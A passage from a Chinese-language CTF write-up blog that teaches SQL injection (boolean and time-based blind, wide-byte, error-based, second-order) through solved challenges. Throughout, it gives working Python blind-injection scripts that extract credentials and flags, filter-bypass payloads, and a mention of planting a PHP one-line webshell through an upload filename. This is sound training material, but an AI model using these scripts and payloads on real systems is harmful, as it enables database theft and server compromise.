path&#x3D;&#39;&#123;$path&#125;&#39;&quot;);$row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC);$path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image&#x2F;jpeg&quot;);readfile($path);</code></pre><p>发现存在sql注入，通过传入id为<code>\\0</code>来转义id后面的引号，与path前面的引号闭合导致sql注入</p><p>exp如下：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;a371750a-b2b0-4f95-9c4f-c2cf5292c17c.node3.buuoj.cn&#x2F;image.php&quot;result &#x3D; &quot;&quot;# ?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select database()),&#123;&#125;,1))?&#123;&#125;,1,0)--+# ?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+  images,users# ?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+  username,password# ?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select group_concat(password) from users),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+   8e97f11c1585e0f6dedb# ?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select group_concat(username) from users),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+   adminpayload &#x3D; &quot;?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select group_concat(password) from users),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+&quot;for i in range(0, 100):    high &#x3D; 127    low &#x3D; 32    mid &#x3D; (low + high) &#x2F;&#x2F; 2    while high &gt; low:        payloads &#x3D; payload.format(i, mid)        # print(url + payloads)        html &#x3D; requests.get(url + payloads)        if &#39;JFIF&#39; in html.text:            low &#x3D; mid + 1        else:            high &#x3D; mid        mid &#x3D; (low + high) &#x2F;&#x2F; 2    result +&#x3D; chr(int(mid))    print(result)</code></pre><p>得到admin的密码登录后是一个文件上传的页面，上传的文件会自动生成一个日志并且告诉了我们路径且后缀为php文件，上传后打开界面会显示文件的名字，于是抓包将文件名改为一句话木马，上传后php就会解析这个页面里的php语法，但是文件名字不能有php在里面，于是就需要一句话的短标签版，前提需要PHP开启短标签即<code>short_open_tag=on</code>，题目支持，随后<code>cat /flag</code>即可</p><h3 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h3><p><code>if(1=1,1,2)</code>测试有回显，于是写脚本爆破</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;228a1e37-3bc0-4272-ac01-c99d47dfd854.node3.buuoj.cn&#x2F;?stunum&#x3D;&quot;result &#x3D; &quot;&quot;# if(ascii(mid((select&#x2F;**&#x2F;database()),&#123;&#125;,1))&gt;&#123;&#125;,1,2)    ctf# if(ascii(mid((select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;,1,2)     flag,score# if(ascii(mid((select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;flag&#39;),&#123;&#125;,1))&gt;&#123;&#125;,1,2)         flag,value# if(ascii(mid((select&#x2F;**&#x2F;value&#x2F;**&#x2F;from&#x2F;**&#x2F;flag),&#123;&#125;,1))&gt;&#123;&#125;,1,2)payload &#x3D; &quot;if(ascii(mid((select&#x2F;**&#x2F;value&#x2F;**&#x2F;from&#x2F;**&#x2F;flag),&#123;&#125;,1))&gt;&#123;&#125;,1,2)&quot;for i in range(0, 100):    high &#x3D; 127    low &#x3D; 32    mid &#x3D; (low + high) &#x2F;&#x2F; 2    while high &gt; low:        payloads &#x3D; payload.format(i, mid)        html &#x3D; requests.get(url + payloads)        if &#39;admin&#39; in html.text:            low &#x3D; mid + 1        else:            high &#x3D; mid        mid &#x3D; (low + high) &#x2F;&#x2F; 2    result +&#x3D; chr(int(mid))    print(result)</code></pre><p>注出flag</p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="WEB-Login-Only-For-36D"><a href="#WEB-Login-Only-For-36D" class="headerlink" title="WEB_Login_Only_For_36D"></a>WEB_Login_Only_For_36D</h3><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210354938.png" alt loading="lazy"></p><p><strong>F12</strong>可以看到<strong>hint</strong></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210443551.png" alt loading="lazy"></p><p>可以看到这里需要username匹配admin，随后才可以输入密码，先在<strong>password</strong>处<strong>fuzz</strong>一下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210743129.png" alt loading="lazy"></p><p>过滤了单引号，如果password中要用单引号闭合的话显然很难这里就需要从username入手，详情可以参考上面的<code>BJDCTF-2nd—简单注入</code>，和p神和Smi1e师傅的文章：</p><ul><li><a href="https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/">[小密圈]经典写配置漏洞与几种变形学习</a></li><li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html">经典写配置漏洞与几种变形</a></li></ul><p>这里直接给出payload：<code>username=admin%0a\&amp;password=/**/or/**/if(left((password),1)REGEXP/**/binary/**/&quot;I&quot;,sleep(3),1)#</code></p><p>exp如下：</p><pre class="language-php" data-language="php"><code class="language-php">import requestsurl &#x3D; &quot;https:&#x2F;&#x2F;bbafd3a8-7f89-4adf-84c2-7028b93775cc.chall.ctf.show&#x2F;&quot;header &#x3D; &#123;    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko&#x2F;20100101 Firefox&#x2F;74.0&quot;,    &quot;Accept&quot;: &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&quot;,    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;str1 &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;passwd &#x3D; &#39;&#39;for i in range(1, 40):    for j in str1:        exp &#x3D; passwd + j        payload &#x3D; &#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;if(left((password),&#123;&#125;)REGEXP&#x2F;**&#x2F;binary&#x2F;**&#x2F;&quot;^&#123;&#125;&quot;,sleep(3),1)#&#39;.format(i, exp)        data &#x3D; &#123;            &#39;username&#39;: &#39;admin%0a\\&#39;,            &#39;password&#39;: payload        &#125;        r &#x3D; requests.post(url,data&#x3D;data,headers&#x3D;header)        if r.elapsed.total_seconds()&gt;1:            passwd &#x3D; passwd + j            print(j,end&#x3D;&#39;&#39;)            break</code></pre><p>这里需要注意以下几点：</p><ul><li><code>binary</code>匹配大小写</li><li><code>mid</code>和<code>substr</code>被过滤了用<code>left</code></li><li>空格用<code>/**/</code></li></ul><p>随后就可以跑出密码登录即可得到<code>flag</code></p><h3 id="XCTF—INSERT-INTO注入"><a href="#XCTF—INSERT-INTO注入" class="headerlink" title="XCTF—INSERT INTO注入"></a>XCTF—INSERT INTO注入</h3><p><strong>解题核心</strong>—————–substr(),x-forwarded-for头注入</p><p>平台：[bugku INSERT INTO注入](<a href="https://ctf.bugku.com/challenges#INSERT">https://ctf.bugku.com/challenges#INSERT</a> INTO注入)题目链接：<a href="http://123.206.87.240:8002/web15/">http://123.206.87.240:8002/web15/</a></p><p>在题目的下方给了源码：</p><pre class="language-php" data-language="php"><code class="language-php">flag格式：flag&#123;xxxxxxxxxxxx&#125;不如写个Python吧error_reporting(0);function getIp()&#123;$ip &#x3D; &#39;&#39;;if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];&#125;else&#123;$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];&#125;$ip_arr &#x3D; explode(&#39;,&#39;, $ip);return $ip_arr[0];&#125;$host&#x3D;&quot;localhost&quot;;$user&#x3D;&quot;&quot;;$pass&#x3D;&quot;&quot;;$db&#x3D;&quot;&quot;;$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);mysql_select_db($db) or die(&quot;Unable to select database&quot;);$ip &#x3D; getIp();echo &#39;your ip is :&#39;.$ip;$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;mysql_query($sql);</code></pre><p>通过观察代码可以发现变量<code>$ip</code>可以通过更改<code>X-Forwarded-For</code>头进行更改，且后面的代码把每一次查询的ip都插入的数据库，推测<code>$ip</code>处存在注入点，于是burp抓包判断注入点：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/OZAFpjoRIb1Wyig.png" style="zoom: 50%;" loading="lazy"><p>利用延时注入验证此处确实存在注入点，于是开始构造注入函数，代码<code>$ip_arr = explode(&#39;,&#39;, $ip);</code>通过逗号将ip分离开，只取第一个，所以这里相当于过过滤了逗号注入符号，于是我们通常用的<code>mid</code>、<code>substr</code>，<code>if</code>判断在这里用不了了，在这里用以下注入方法替换：</p><p><code>if(sql,num,str)</code>可替换成<code>case when sql then sleep(5) else 1 end</code></p><p><code>sql</code>注入语句中的<code>substr</code>语句可以写成：<code>substr(sql from num for 1) = str</code>，将语句中的逗号替换成了<code>from</code>和<code>for</code>，语句照常进行，<code>mid</code>函数也可以这样</p><p>Payload1：<code>127.0.0.1&#39;and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end )) #</code>，得到表<code>client_ip</code>,<code>flag</code></p><p>Payload2：<code>127.0.0.1&#39;and (case when (substr((select group_concat(column_name) from information_schema.columns where table_schema=&#39;flag&#39;) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end )) #</code>，得到表<code>flag</code>中的<code>flag</code>列</p><p>Payload3：<code>127.0.0.1&#39;and (case when (substr((select group_concat(flag) from flag) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end )) #</code>，得到<code>flag</code>列中的<code>flag</code></p><p>python脚本如下：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsstr &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*.-&quot;url &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web15&#x2F;&quot;for i in range(0,40):    for j in str:        data &#x3D; &quot;此处为Payload&quot;.format(i,j)        header &#x3D; &#123;&quot;x-forwarded-for&quot;:data&#125;        r &#x3D; requests.get(url,headers&#x3D;header)        if r.elapsed.total_seconds()&gt;1:            print(j,end &#x3D; &#39;&#39;)            break</code></pre><h3 id="2020ichunqiu新春公益赛—盲注"><a href="#2020ichunqiu新春公益赛—盲注" class="headerlink" title="2020ichunqiu新春公益赛—盲注"></a>2020ichunqiu新春公益赛—盲注</h3><p>首先点进去的界面：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    # flag在fl4g里    include &#39;waf.php&#39;;    header(&quot;Content-type: text&#x2F;html; charset&#x3D;utf-8&quot;);     $db &#x3D; new mysql();    $id &#x3D; $_GET[&#39;id&#39;];    if ($id) &#123;        if(check_sql($id))&#123;            exit();        &#125; else &#123;            $sql &#x3D; &quot;select * from flllllllag where id&#x3D;$id&quot;;            $db-&gt;query($sql);        &#125;    &#125;    highlight_file(__FILE__);</code></pre><p>可以看到需要我们get一个id参数来绕过waf里的check_sql函数完成注入，并且<code>flag</code>在<code>fl4g</code>里</p><p>首先题目过滤了select，fuzz后发现以下字符和函数被过滤</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/gKbs6mkaDcpUx5W.png" style="zoom: 80%;" loading="lazy"><p>发现<code>sleep</code>函数并没有被过滤，于是想到延时注入，<code>=</code>、<code>like</code>、<code>rlike</code>被过滤用<code>regexp</code>函数代替</p><p>regexp后所跟的东西作为正则表达式处理。</p><p>Payload：<code>id=1 and if(ascii(mid(fl4g,1,1))regexp 102,sleep(3),1)</code></p><p>于是写出盲注注入脚本</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;c6a55177986a42829935671bc7988fbd1a2652564f754cac.changame.ichunqiu.com&#x2F;?id&#x3D;&quot;for i in range(1,100):    for j in range(45,128):        if j&lt;58 or j&gt;96:        #d &#x3D; &quot;1 and if(ascii(mid(fl4g,1,1))regexp &quot;+str(j)+&quot;,sleep(3),1)&quot;            d &#x3D; &quot;1 and if(ascii(mid(fl4g,&quot;+str(i)+&quot;,1))regexp &quot;+str(j)+&quot;,sleep(3),1)&quot;            r &#x3D; requests.get(url+d)            if r.elapsed.total_seconds()&gt;1:                print(chr(j),end&#x3D;&#39;&#39;)                break</code></pre><h3 id="网鼎杯2018—Unfinish"><a href="#网鼎杯2018—Unfinish" class="headerlink" title="网鼎杯2018—Unfinish"></a>网鼎杯2018—Unfinish</h3><p>登录用的邮箱和密码，注册可以注册邮箱账号和密码，并且在登录后的index.php处有显示注册的用户名，用户名存入了数据库，于是推测在register.php处存在注入点，测试后发现过滤了逗号和information，不过可以用from和for代替，payload：<code>0&#39; or (case when (substr((select * from flag) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end) or &#39;1</code>，注意这里判断响应时间的时候要用time库，平常用的<code>elapsed.total_seconds()</code>在这里好像不管用，测试后发现这个函数获得的是最后一次请求的响应时间，而题目中的register.php注册成功会重定向到login.php，于是会导致结果输出不出来，于是改用time库</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timestr &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,&#123;&#125;_!@#$%^&amp;*.-&quot;url &#x3D; &quot;http:&#x2F;&#x2F;221e6a91-2118-48a2-832a-a910da7b4e1b.node3.buuoj.cn&#x2F;register.php&quot;header &#x3D; &#123;    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko&#x2F;20100101 Firefox&#x2F;74.0&quot;,    &quot;Accept&quot;: &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&quot;,    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;for i in range(0,50):    for j in str:        payload &#x3D; &quot;0&#39; or (case when (substr((select * from flag) from &#123;&#125; for 1 )&#x3D;&#39;&#123;&#125;&#39;) then sleep(3) else 1 end) or &#39;1&quot;.format(i,j)        #print(payload)        data &#x3D; &#123;            &quot;email&quot;:&quot;111@111&quot;,            &quot;username&quot;:payload,            &quot;password&quot;:&quot;aaa&quot;        &#125;        startTime&#x3D;time.time()        r &#x3D; requests.post(url,data&#x3D;data,headers&#x3D;header)        #print(r.status_code)        #print(r.text)        if time.time()-startTime&gt;1:            print(j,end &#x3D; &#39;&#39;)            break</code></pre><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="2020ichunqiu新春公益赛—easysqli-copy"><a href="#2020ichunqiu新春公益赛—easysqli-copy" class="headerlink" title="2020ichunqiu新春公益赛—easysqli_copy"></a>2020ichunqiu新春公益赛—easysqli_copy</h3><p><a href="https://www.freebuf.com/articles/web/216336.html">参考1</a> ，<a href="https://xz.aliyun.com/t/3950">参考2</a></p><p>界面代码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php     function check($str)    &#123;        if(preg_match(&#39;&#x2F;union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database&#x2F;i&#39;,$str,$matches))        &#123;            print_r($matches);            return 0;        &#125;        else        &#123;            return 1;        &#125;    &#125;    try    &#123;        $db &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;pdotest&#39;,&#39;root&#39;,&#39;******&#39;);    &#125;     catch(Exception $e)    &#123;        echo $e-&gt;getMessage();    &#125;    if(isset($_GET[&#39;id&#39;]))    &#123;        $id &#x3D; $_GET[&#39;id&#39;];    &#125;    else    &#123;        $test &#x3D; $db-&gt;query(&quot;select balabala from table1&quot;);        $res &#x3D; $test-&gt;fetch(PDO::FETCH_ASSOC);        $id &#x3D; $res[&#39;balabala&#39;];    &#125;    if(check($id))    &#123;        $query &#x3D; &quot;select balabala from table1 where 1&#x3D;?&quot;;        $db-&gt;query(&quot;set names gbk&quot;);        $row &#x3D; $db-&gt;prepare($query);        $row-&gt;bindParam(1,$id);        $row-&gt;execute();    &#125;</code></pre><p> <code>$db-&gt;query(&quot;set names gbk&quot;);</code>这个语句构成了宽字节注入，即可以利用<code>%d5&#39;</code>闭合单引号形成宽字节注入，闭合单引号后后面的语句就是可控的了，所以后面只需要构造注入语句绕过waf即可，过滤的绝大多数字符，于是这里使用<code>prepare</code>预编译注入</p><p>格式：<code>set @a=执行的语句;prepare ctftest from @a; execute ctftest;</code>，该格式支持十六进制编码和ascii编码注入，于是就可以进行绕过</p><p>于是就可以用该预编译注入+延时注入+布尔盲注来爆出所有内容</p><p>爆列Payload：<code>select if(ascii(mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;table1&#39;),&#123;&#125;,1))= &#123;&#125;,sleep(3),1)</code></p><p>爆字段payload：<code>select if(ascii(mid((select group_concat(fllllll4g,&#39;&#39;) from table1),&#123;&#125;,1))= &#123;&#125;,sleep(3),1)</code></p><p>写出盲注脚本：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;8e2a5a61db69418f8ebe1c973c4bdecfa176617cfa094611.changame.ichunqiu.com&#x2F;?id&#x3D;&quot;def str_to_hex(s):    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s])for i in range(1,100):    for j in range(45,128):        d &#x3D; &quot;(This is Payload)&quot;.format(i,j)        payload &#x3D; str_to_hex(d)        a &#x3D; &quot;%df%27;set @a&#x3D;0x&#123;&#125;;prepare a from @a; execute a;&quot;.format(payload)        r &#x3D; requests.get(url+a)        if r.elapsed.total_seconds()&gt;1:            print(chr(j),end&#x3D;&#39;&#39;)            break</code></pre><p>得到<code>table1</code>表中的列：<code>balabala,eih@y,fllllll4g,bbb</code>,最终在<code>fllllll4g</code>列中得到flag</p><h3 id="安恒杯-新春祈福赛—BabySqliv2-0"><a href="#安恒杯-新春祈福赛—BabySqliv2-0" class="headerlink" title="安恒杯-新春祈福赛—BabySqliv2.0"></a>安恒杯-新春祈福赛—BabySqliv2.0</h3><p><strong>解题核心</strong>—————–异或注入，报错注入，宽字节注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/g86QP1C5ZsThjan.png" alt loading="lazy"></p><p>界面的上题一样，发现只要用admin账号登录，无论用什么密码都能登录进去，登进去后界面如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200202205759631.png" alt loading="lazy"></p><p>于是在登录界面测试，单引号注入无效，猜测转义了单引号，利用宽字节注入，果不其然，于是利用报错注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/4cPp1rotWQnUvew.png" alt loading="lazy"></p><p>文章参考：<a href="https://www.gem-love.com/websecurity/467.html">简析GXY_CTF “BabySqli v2.0”宽字节注入</a></p><p>报错注入有三种方法：floor()，extractvalue()，updatexml()，这里采用extractvalue()报错注入：</p><p>查库：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(seselectlect(group_concat(database())))));--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/KDtnXxQcPvYRGV6.png" alt loading="lazy"></p><p>查表：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(selselectect(group_concat(table_name))from(information_schema.tables)whewherere((table_schema)&#x3D;database()))));--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/YvlyLpUX7qZESNP.png" alt loading="lazy"></p><p>由此可知flag应该在f14g中</p><p>查字段：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(selselectect(group_concat(column_name))from(information_schema.columns)whwhereere((table_name)&#x3D;char(102,49,52,103)))));--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/hIfBtkgzYT4qNOa.png" alt loading="lazy"></p><blockquote><p>注：这里应该是过滤了列的直接查询，用char()函数进行绕过即可</p></blockquote><p>解密MD5值后为id</p><p>id列查询：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(selselectect group_concat(b80bb7740288fda1f201890375a60c8f) from f14g)))--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/9wQR4Un3pDref1W.png" alt loading="lazy"></p><p>还真全是id了，看大佬博客后发现居然还可以盲猜flag？？？</p><p>flag的MD5值为327a6c4304ad5938eaf0efb6cc3e53dc</p><p>flag列查询：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g)))--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/xoZzpbPdajKuqD3.png" alt loading="lazy"></p><p>base64解密后为“The first man name was k”。。。。。。。。。。</p><p>配合limit进行查询，在limit 22,1处发现flag</p><pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,(selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1)))--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/PXqxeEV3Hvp7cRw.png" alt loading="lazy"></p><p>解码后只显示前面的flag，应该是前端界面限制了字符串的显示</p><p>于是用到substr()函数进行字符串的截取：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1%d5&#39;^extractvalue(1,concat(1,substr((selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),10,32)))--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Qo3SelyJVt6qbkM.png" alt loading="lazy"></p><p>去掉相同的拼合起来base64解码后即可得到flag</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="网鼎杯-2018—Comment"><a href="#网鼎杯-2018—Comment" class="headerlink" title="网鼎杯 2018—Comment"></a>网鼎杯 2018—Comment</h3><p>上来先扫描一波，扫到了<code>.git</code>，<code>index.php</code>，<code>login.php</code>，<code>git</code>源码泄露，用<code>Githack</code>工具进行恢复</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161036570.png" alt loading="lazy"></p><p>发现case后的直接break了，什么操作都没有，估计这份代码不全，使用<code>git</code>进行恢复</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161519874.png" alt="image-20200509161519874" loading="lazy"></p><p>找到历史commit版本，进行代码恢复，得到最终<code>write_do.php</code>源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;    header(&quot;Location: .&#x2F;login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    $category &#x3D; addslashes($_POST[&#39;category&#39;]);    $title &#x3D; addslashes($_POST[&#39;title&#39;]);    $content &#x3D; addslashes($_POST[&#39;content&#39;]);    $sql &#x3D; &quot;insert into board            set category &#x3D; &#39;$category&#39;,                title &#x3D; &#39;$title&#39;,                content &#x3D; &#39;$content&#39;&quot;;    $result &#x3D; mysql_query($sql);    header(&quot;Location: .&#x2F;index.php&quot;);    break;case &#39;comment&#39;:    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;    $result &#x3D; mysql_query($sql);    $num &#x3D; mysql_num_rows($result);    if($num&gt;0)&#123;    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];    $content &#x3D; addslashes($_POST[&#39;content&#39;]);    $sql &#x3D; &quot;insert into comment            set category &#x3D; &#39;$category&#39;,                content &#x3D; &#39;$content&#39;,                bo_id &#x3D; &#39;$bo_id&#39;&quot;;    $result &#x3D; mysql_query($sql);    &#125;    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);    break;default:    header(&quot;Location: .&#x2F;index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: .&#x2F;index.php&quot;);&#125;?&gt;</code></pre><p><code>write</code>操作对应发帖，<code>comment</code>操作对应评论操作，但是在进行这些操作的前提是要登录上，于是我们看到登录界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161906786.png" alt loading="lazy"></p><p>两个提示似乎在暗示这什么，于是对密码的三个*出处进行爆破，得到密码<code>zhangwei666</code>成功登录，来到发帖界面，首先我们看发帖操作，用<code>addslashes</code>函数对参数进行了过滤，说到<code>addslashes</code>引发的安全问题可以查看这篇文章：<a href="https://bbs.ichunqiu.com/thread-10899-1-1.html">https://bbs.ichunqiu.com/thread-10899-1-1.html</a></p><p>里面介绍了绕过<code>addslashes</code>函数的方法，但在这里似乎用不到，仔细观察代码，<code>addslashes</code>函数限制了我们对一些特殊符号的操作，使得sql语句能够正常的执行，但并没有改变插入到数据库中的数据，测试如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509163056815.png" alt loading="lazy"></p><p>可以看到并不会改变存入数据库中的内容，查询出里面的结果也是一样，于是我们再看到<code>commit</code>操作，里面的<code>mysql_fetch_array</code>函数在数据库中取出<code>category</code>字段中的内容，然后再直接进行了<code>insert into</code>存入评论数据的操作操作传入的参数<code>category</code>我们可，后面的<code>content</code>参数我们也可控于是就可以进行如下操作：</p><p>先传入<code>category</code>字段的值为<code>a&#39;,content=(select user()),/*</code>,前面的单引号虽然在存入数据库的过程中被转义了，但是数据库中华存的依旧是用来的内容，后面的取出来的时候也会将单引号原封不动的取出来，在进行<code>comment</code>的<code>insert into</code>操作时候，就会闭合前面的单引号，从而达到注入的目的，然后跟上的<code>content</code>值当然就是要进行<code>sql</code>注入查找数据的操作，然后再接上<code>/*</code>，这样我们后面再评论页面进行评论的时候传入<code>*/#</code>就能成功的和前面的闭合起来，总<code>payload</code>如下：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">insert into comment set category &#x3D; &#39;a&#39;,content&#x3D;(select user()),&#x2F;*&#39;,content &#x3D; &#39;*&#x2F;#&#39;,bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre><p>得到回显：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509164939746.png" alt loading="lazy"></p><p>尝试写马无果，应该是权限不够，然后再ctf数据库查到三个表<code>board,comment,user</code></p><p><code>user</code>表中有如下列</p><pre class="language-none"><code class="language-none">id,username,password,Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,Create_tablespace_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections,plugin,authentication_string</code></pre><p><code>board</code>表中有如下列</p><pre class="language-none"><code class="language-none">id,category,title,content</code></pre><p><code>comment</code>表中有如下列</p><pre class="language-none"><code 